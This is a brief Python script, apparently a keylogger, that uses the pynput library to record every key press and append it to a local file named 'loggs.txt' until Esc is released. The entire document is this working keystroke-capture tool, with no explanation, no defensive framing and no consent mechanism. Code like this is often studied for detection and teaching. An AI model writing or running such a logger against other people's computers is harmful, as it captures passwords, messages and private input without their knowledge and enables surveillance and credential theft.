import sys
from pynput.keyboard import Listener,Key
def key_pressed (key):
    with open ("loggs.txt","a") as logs_file:
        logs_file.write(str({key}))
        logs_file.write("\n")
def key_unpressed (key):
    if key == Key.esc:
        return 0

with Listener (on_press=key_pressed,on_release= key_unpressed) as listener :
    listener.join()